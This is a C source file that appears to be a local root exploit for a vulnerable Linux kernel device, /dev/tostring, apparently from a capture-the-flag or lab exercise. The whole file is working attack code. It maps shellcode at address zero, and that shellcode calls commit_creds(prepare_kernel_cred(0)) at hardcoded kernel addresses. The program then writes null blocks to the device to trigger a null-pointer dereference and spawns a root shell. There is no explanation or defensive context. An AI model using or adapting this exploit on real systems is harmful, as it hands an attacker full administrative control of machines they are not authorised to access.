#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <string.h>
struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));

prepare_kernel_cred_t   prepare_kernel_cred = 0xc10711f0;
commit_creds_t    commit_creds =  0xc1070e80;


void get_root() {
  if (commit_creds && prepare_kernel_cred)
    commit_creds(prepare_kernel_cred(0));
}

int main()
{
        // maps shellcode to address 0 for when null pointer is derefernced
        char* m = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        // commit_creds(prepare_kernel_cred(0))
        unsigned char sc[] = 
        { 0xb8, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x31, 0xC0, 0xC3 };
/*      void **get_root_offset = rawmemchr(shellcode, 0x42);*/
        void **get_root_offset = &sc[1];
        (*get_root_offset) = get_root;
        // copy shellcode into the mmap'd memory
        memcpy(m, sc, sizeof(sc));
        int fd = open("/dev/tostring", O_RDWR);
          for(int i=0; i<65; i++){
                  write(fd, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
        }
        char* buf = (char*)malloc(8);
        // call read
        fd = open("/dev/tostring", O_RDWR);
        read(fd, buf, 8);
        // trigger null pointer dereference
        system("/bin/sh");
        return 0;
}
